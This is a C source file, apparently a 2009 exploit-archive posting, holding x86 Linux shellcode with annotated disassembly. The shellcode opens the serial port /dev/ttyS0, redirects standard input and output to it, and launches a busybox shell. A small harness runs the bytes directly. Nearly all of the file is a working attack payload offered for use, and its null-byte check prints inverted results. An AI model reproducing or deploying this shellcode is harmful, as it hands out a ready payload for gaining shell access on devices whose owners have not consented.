/*
General:
	Serial port shell binding, busybox launching shellcode.. yey!

Specific:
	*really* wish i could tell you what i needed this for.. but meh..

	this will bind a busybox sh shell to /dev/ttyS0, the shellcode
does not alter the baudrate settings.. 9600 is the default, but its easy enough to cycle though if were
at a different baud rate.


...damn how long has it been since i posted one of these?

happy hunting


-phar
     @
       stonedcoder
mdavis             .
      @              org
        ioactive
                 .
                   com

main:
 31 d2                   xor    %edx,%edx
 31 c0                   xor    %eax,%eax
 6a 02                   push   $0x2			 #flags O_RDW
 59                      pop    %ecx
 66 b8 53 30             mov    $0x3053,%ax
 50                      push   %eax
 68 2f 74 74 79          push   $0x7974742f		#port device
 68 2f 64 65 76          push   $0x7665642f
 89 e3                   mov    %esp,%ebx
 6a 05                   push   $0x5
 58                      pop    %eax
 89 c6                   mov    %eax,%esi
 cd 80                   int    $0x80			#open
 89 c6                   mov    %eax,%esi
 31 c9                   xor    %ecx,%ecx

dup2_loop:						#set the serial port as our console
 89 f3                   mov    %esi,%ebx
 6a 3f                   push   $0x3f
 58                      pop    %eax
 cd 80                   int    $0x80			#dup2
 41                      inc    %ecx
 80 f9 03                cmp    $0x3,%cl
 75 f3                   jne    80483a7 dup2_loop
 66 b8 73 68             mov    $0x6873,%ax
 50                      push   %eax
 89 e1                   mov    %esp,%ecx
 52                      push   %edx
 51                      push   %ecx
 89 e1                   mov    %esp,%ecx
 52                      push   %edx
 68 79 62 6f 78          push   $0x786f6279		#/bin/busybox
 68 2f 62 75 73          push   $0x7375622f
 68 2f 62 69 6e          push   $0x6e69622f
 89 e3                   mov    %esp,%ebx
 6a 0b                   push   $0xb
 58                      pop    %eax
 cd 80                   int    $0x80			#execve
*/





int main() {
char shellcode[] = {
"\x31\xd2\x31\xc0\x6a\x02\x59\x66\xb8\x53\x30\x50\x68\x2f\x74\x74"
"\x79\x68\x2f\x64\x65\x76\x89\xe3\x6a\x05\x58\x89\xc6\xcd\x80\x89"
"\xc6\x31\xc9\x89\xf3\x6a\x3f\x58\xcd\x80\x41\x80\xf9\x03\x75\xf3"
"\x66\xb8\x73\x68\x50\x89\xe1\x52\x51\x89\xe1\x52\x68\x79\x62\x6f"
"\x78\x68\x2f\x62\x75\x73\x68\x2f\x62\x69\x6e\x89\xe3\x6a\x0b\x58"
"\xcd\x80"};
char cnull = 0;

        printf("shellcode_size: %u\n", sizeof(shellcode));
        printf("contains nulls: ");
        if(!memmem(shellcode,sizeof(shellcode),&cnull,1)){
                printf("yes\n");
        }else{
                printf("no\n");
        }
	(*(void(*)()) shellcode)();
}

// milw0rm.com [2009-04-30]